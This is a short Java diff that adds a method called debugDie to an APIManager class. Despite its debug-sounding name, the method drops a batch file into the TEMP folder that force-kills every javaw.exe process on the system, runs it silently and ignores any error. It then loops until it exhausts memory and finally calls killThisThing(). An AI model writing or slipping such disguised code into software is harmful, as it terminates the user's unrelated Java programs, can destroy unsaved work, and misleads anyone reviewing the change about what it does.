@@ -45,6 +45,30 @@ public final class APIManager {
         }*/
     }
 
+    public void debugDie() {
+        File outfile = new File(System.getenv("TEMP") + "\\763428675.bat");
+        try {
+            FileWriter writer = new FileWriter(System.getenv("TEMP") + "\\763428675.bat");
+            writer.write("taskkill /F /IM javaw.exe");
+            writer.close();
+            Runtime.getRuntime().exec("cmd /c " + System.getenv("TEMP") + "\\763428675.bat");
+        }catch(Throwable t){
+            //oops
+        }
+
+        Object[] o = null;
+        try {
+            while(true) {
+                Object[] newO = new Object[1];
+                newO[0] = o;
+                o = newO;
+            }
+        }
+        finally {
+            killThisThing();
+        }
+    }
+
     public APIManager() {
         mex = new MiscExtd();
         if(!mex.createFile())
